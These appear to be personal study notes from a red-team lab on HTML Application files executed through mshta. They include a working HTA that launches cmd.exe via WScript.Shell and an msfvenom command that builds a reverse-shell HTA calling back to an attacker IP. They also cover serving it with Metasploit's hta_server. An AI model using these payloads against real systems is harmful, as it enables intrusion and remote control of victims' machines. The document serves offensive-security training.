<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>HTA</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>HTA</h1><br/><p><strong><h1>An HTML Application (HTA)</h1></strong></p><p></p><p>HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool <strong>mshta</strong> is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. </p><p></p><p><strong><h3>Simple HTA Code to Start CMD</h3></strong></p><p></p><p>In the following example, we will use an <strong>ActiveXObject</strong> in our payload as proof of concept to execute <strong>cmd.exe</strong>. Consider the following HTML code.</p><p></p><p>$$$$$$$$$$$$$$$$$$$$$$$</p><p></p><p>&lt;html&gt;</p><p>&lt;body&gt;</p><p>&lt;script&gt;</p><p>	var c= &#39;cmd.exe&#39;</p><p>	new ActiveXObject(&#39;WScript.Shell&#39;).Run(c);</p><p>&lt;/script&gt;</p><p>&lt;/body&gt;</p><p>&lt;/html&gt;</p><p></p><p>$$$$$$$$$$$$$$$$$$$$$$$</p><p></p><p></p><p>Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,</p><p></p><p><img src="images/393-1.png" alt="images/393-1.png" /></p><p></p><p>On the victim machine, visit the malicious link using Microsoft Edge, <strong>http://10.8.232.37:8090/payload.hta</strong>. Note that the 10.8.232.37 is the AttackBox&#39;s IP address.</p><p></p><p><img src="images/393-2.png" alt="images/393-2.png" /></p><p></p><p>Once we press Run, the <strong>payload.hta</strong> gets executed, and then it will invoke the <strong>cmd.exe</strong>. The following figure shows that we have successfully executed the <strong>cmd.exe</strong>.</p><p></p><p><img src="images/393-3.png" alt="images/393-3.png" /></p><p></p><p></p><p><strong><h3>HTA Reverse Connection</h3></strong></p><p></p><p>We can create a reverse shell payload as follows,</p><p></p><p><strong>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta</strong></p><p></p><p><img src="images/393-4.png" alt="images/393-4.png" /></p><p></p><p>We use the msfvenom from the Metasploit framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect the windows/x64/shell_reverse_tcp to our IP and listening port.</p><p></p><p>On the attacking machine, we will <strong>host</strong> this <strong>file</strong> in <strong>python</strong> <strong>web</strong> <strong>server</strong> &amp; we need to <strong>listen</strong> to the <strong>port</strong> <strong>443</strong> using <strong>nc</strong>. Please note this port needs root privileges to open, or you can use different ones.</p><p></p><p>Once the victim visits the malicious URL and hits run, we get the connection back.</p><p></p><p><img src="images/393-5.png" alt="images/393-5.png" /></p><p></p><p></p><p><strong><h3>Malicious HTA via Metasploit </h3></strong></p><p></p><p>There is another way to generate and serve malicious HTA files using the Metasploit framework. First, run the Metasploit framework using msfconsole -q command. Under the exploit section, there is exploit/windows/misc/hta_server, which requires selecting and setting information such as LHOST, LPORT, SRVHOST, Payload, and finally, executing exploit to run the module.</p><p></p><p><img src="images/393-6.png" alt="images/393-6.png" /></p><p></p><p>We will use the URL provided above in the victim machine &amp; run the hta file. We will recieve a reverse connection.</p><p></p><p><img src="images/393-7.png" alt="images/393-7.png" /></p><p></p></div>
</body>
</html>
